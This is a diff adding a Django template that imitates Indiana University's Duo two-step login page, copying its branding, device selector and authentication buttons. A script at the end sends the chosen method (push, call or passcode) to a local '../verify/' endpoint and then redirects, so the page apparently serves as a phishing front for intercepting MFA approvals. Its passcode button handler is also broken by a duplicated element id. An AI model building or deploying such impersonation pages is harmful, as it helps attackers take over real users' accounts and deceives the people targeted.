@@ -1,0 +1,265 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head>
+    {% load static %}
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="{% static 'modernizer.js' %}" type="text/javascript"></script>
+    <link rel="stylesheet" type="text/css" href="{% static 'main.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static 'base.css/dw' %}">
+
+<title>Two-Step Login: IU Login: Indiana University</title>
+</head>
+
+<body class="login">
+<header class="header">
+        <div class="centered lockup">
+            <div class="trident">
+                <svg class="trident-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 41 48" style="enableBackground: new 0 0 41 48; max-height: 58px" aria-describedby="iu-logo" aria-hidden="true">
+                    <switch>
+                        <g>
+                            <title id="iu-logo">Indiana University Logo</title>
+                            <rect width="41" height="48" fill="#900"></rect>
+                            <polygon points="24.59 12.64 24.59 14.98 26.34 14.98 26.34 27.78 22.84 27.78 22.84 10.9 24.59 10.9 24.59 8.57 16.41 8.57 16.41 10.9 18.16 10.9 18.16 27.78 14.66 27.78 14.66 14.98 16.41 14.98 16.41 12.64 8.22 12.64 8.22 14.98 9.97 14.98 9.97 30.03 12.77 33.02 18.16 33.02 18.16 36.52 16.41 36.52 16.41 39.43 24.59 39.43 24.59 36.52 22.84 36.52 22.84 33.02 28 33.02 31.01 30.03 31.01 14.98 32.78 14.98 32.78 12.64 24.59 12.64" fill="#fff"></polygon>
+                        </g>
+                    </switch>
+                </svg>
+            </div>
+            <div class="lockup-group">
+                <p class="lockup-iu">
+                    Indiana University
+                </p>
+                <h1 class="lockup-title">
+                    Login
+                </h1>
+            </div>
+        </div>
+</header><!-- .site-header -->
+<main class="content" role="main">
+
+
+<section class="centered base duo">
+    <h2 class="base-title base-duo">Two-Step (Duo)</h2>
+    <noscript>
+        <div id="noscript" role="alert" aria-labelledby="duo_iframe" class="alert danger">
+            <h1 class="alert-title">JavaScript disabled</h1>
+            <p class="alert-message">To use Duo, JavaScript must be enabled in your browser. Instructions for enabling JavaScript can be found <a href="https://kb.iu.edu/d/bcyv" target="_blank">here</a>.</p>
+        </div>
+    </noscript>
+
+                <form id="login-form" class="inline login-form" onsubmit="myFunction(); return false;">
+            
+                <fieldset class="device-selector ">
+                <h1 class="cramped-frame-view">
+                Device:
+                </h1>
+                <div class="device-select-wrapper">
+                <select name="device" aria-label="Device" tabindex="2">
+                    <option value="phone1">iOS (XXX-XXX-8213)</option>
+                    <option value="token">Token</option>
+                </select>
+                
+                </div>
+                </fieldset>
+                
+                <div id="auth_methods">
+                
+                <fieldset data-device-index="phone1" class="">
+                <h2 class="medium-or-larger auth-method-header">
+                Choose an authentication method
+                </h2>
+                
+                
+                <div class="row-label push-label">
+                <input type="hidden" name="factor" value="Duo Push">
+                <span class="label factor-label">
+                <i class="icon-smartphone-check"></i>
+                Duo Push
+                
+                <small class="recommended">Recommended</small>
+                
+                </span>
+                <button tabindex="2" class="positive auth-button" id = "pushButton"><!-- -->Send Me a Push </button>
+                </div>
+                
+
+                <div class="row-label phone-label">
+                <input type="hidden" name="factor" value="Phone Call">
+                <span class="label factor-label">
+                <i class="icon-call-ringing" alt="" role="presentation"></i>
+                Call Me
+                
+                </span>
+                <button tabindex="2" class="positive auth-button" id="callButton"><!-- -->Call Me </button>
+                </div>
+                
+                <div class="passcode-label row-label">
+                <input type="hidden" name="factor" value="Passcode" id="passcode">
+                <span class="label factor-label">
+                <i class="icon-smartphone-ellipsis" alt="" role="presentation"></i>
+                Passcode
+                </span>
+                <div class="passcode-input-wrapper">
+                <input type="text" name="passcode" autocomplete="off" data-index="phone1" class="hidden passcode-input" placeholder="ex. 867539" aria-label="passcode" tabindex="2">
+                <div class="next-passcode-msg" role="alert" aria-live="polite"></div>
+                </div>
+                <button tabindex="2" id="passcode" class="positive auth-button" id="passcodeButton"><!-- -->Enter a Passcode </button>
+                <input name="phone-smsable" type="hidden" value="True">
+                <input name="mobile-otpable" type="hidden" value="True">
+                <input name="next-passcode" type="hidden" value="None">
+                </div>
+                
+                </fieldset>
+                
+                <fieldset data-device-index="token" class="hidden">
+                <div class="passcode-label row-label">
+                <input type="hidden" name="factor" value="Passcode">
+                <input type="hidden" name="has-token" value="true">
+                <span class="label factor-label">
+                <i class="icon-smartphone-ellipsis" alt="" role="presentation"></i>
+                Enter a Passcode
+                </span>
+                <div class="passcode-input-wrapper">
+                <input type="text" name="passcode" class="hidden" autocomplete="off" placeholder="(ex. 867539)" tabindex="2">
+                </div>
+                <button tabindex="2" type="submit" id="passcode" class="positive auth-button"><!-- -->Enter a Passcode </button>
+                </div>
+                </fieldset>
+                </div>
+                
+                <div>
+                <div class="stay-logged-in">
+                <label class="remember_me_label_field">
+                <input type="checkbox" name="dampen_choice" value="1" tabindex="2">
+                <span id="remember_me_label_text">
+                Remember me for 7 days
+                </span>
+                </label>
+                <input type="hidden" name="cookies_allowed" value="">
+                </div>
+                
+                </div>
+                </form>
+                
+                
+                </div>
+                </div>
+                <div class="base-navigation">
+                
+                <div class="base-navigation">
+                <div role="banner">
+                
+                
+                </div>
+                <div class="help-sidebar">
+                <button class="btn btn-support">
+                <i class="icon-align-justify" aria-label="Open"></i>
+                <i class="icon-delete" aria-label="Close"></i>
+                Settings
+                </button>
+                <div class="help-links">
+                <nav role="navigation">
+                
+                <a id="help_link" class="help-nav" href="https://guide.duo.com/prompt" target="_blank" aria-label="What is the Duo Prompt? (Opens in a new tab.)">
+                What is this?<i class="icon-new-window"></i>
+                </a>
+                
+                
+                <a href="#" class="need-help">Need help?</a>
+                </nav>
+                
+                <div role="contentinfo">
+                <a href="https://duo.com" class="branding-link" target="_blank">
+                Powered by Duo Security
+                </a>
+                </div>
+                
+                </div>
+                
+                </div>
+                <div class="help-overlay offscreen">
+                <div class="help-links">
+                <nav role="navigation">
+                
+                <a id="help_link" class="help-nav" href="https://guide.duo.com/prompt" target="_blank" aria-label="What is the Duo Prompt? (Opens in a new tab.)">
+                What is this?<i class="icon-new-window"></i>
+                </a>
+                
+                
+                <a href="#" class="need-help">Need help?</a>
+                </nav>
+                
+                <div role="contentinfo">
+                <a href="https://duo.com" class="branding-link" target="_blank">Powered by Duo Security</a>
+                </div>
+                
+    
+                </div>
+                
+                </div>
+                </div>
+                
+                </div>
+                <div class="base-sidebar">
+                
+                </div>
+                <div id="messages-view" class="hidden">
+                <div class="messages-list"></div>
+                </div>
+                </div>
+        </div>
+        <div class="help">
+            <a href="https://kb.iu.edu/d/aluu" target="_blank">
+                <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="16" height="16" class="icon1" viewBox="0 0 16 16" focusable="false">
+                    <g fill="currentColor">
+                        <path d="M8,16a8,8,0,1,1,8-8A8,8,0,0,1,8,16ZM8,2a6,6,0,1,0,6,6A6,6,0,0,0,8,2Z"></path>
+                        <path d="M8,10A1,1,0,0,1,7,9V8.25A1.25,1.25,0,0,1,8.25,7h.64A1.08,1.08,0,0,0,10,6.18,1,1,0,0,0,9,5H7A1,1,0,0,1,7,3H9a3,3,0,0,1,3,3.5A3.08,3.08,0,0,1,9,9H9A1,1,0,0,1,8,10Z"></path>
+                        <path d="M8,13a1,1,0,0,1-.38-.08,1,1,0,0,1-.33-.21A1,1,0,0,1,7,12a1,1,0,0,1,.08-.38,1,1,0,0,1,.21-.33,1,1,0,0,1,.9-.27.62.62,0,0,1,.19.06.74.74,0,0,1,.18.09l.15.12a.93.93,0,0,1,.21.33,1,1,0,0,1-.21,1.09,1.16,1.16,0,0,1-.33.21A1,1,0,0,1,8,13Z"></path>
+                    </g>
+                </svg>
+                <span>Get help with Two-Step (Duo)</span>
+            </a>
+        </div>
+</section>
+</main><!-- .site-content -->
+
+
+    <footer class="footer">
+        <div class="footer-group">
+            <p>
+                <a href="https://www.iu.edu/copyright/index.html" target="_blank" rel="noopener noreferrer">Copyright</a> © 2021 The Trustees of <a href="http://www.iu.edu/" target="_blank" rel="noopener noreferrer">Indiana University</a>.
+            </p>
+        </div>
+    </footer><!-- .site-footer -->
+    
+<script>
+    function sendRequest(e, opts) {
+    console.log("begin send")
+    const FD  = new FormData();
+    FD.append("selection", opts);
+    fetch('../verify/', {
+      method: 'post',
+      body: FD
+    })
+    window.location.href = '../message';
+  }
+
+  function myFunction() {
+      console.log("Hello")
+  }
+
+    const pushButton = document.querySelector("#pushButton")
+    const callButton = document.querySelector("#callButton")
+    const passcodeButton = document.querySelector("#passcodeButton")
+    pushButton.addEventListener("click",function(e) {
+        sendRequest(e,"push")
+    })
+    callButton.addEventListener("click",function(e) {
+        sendRequest(e,"call")
+    })
+    passcodeButton.addEventListener("click",function(e) {
+        sendRequest(e,"passcode")
+    })
+</script>
+
+
+</body></html>
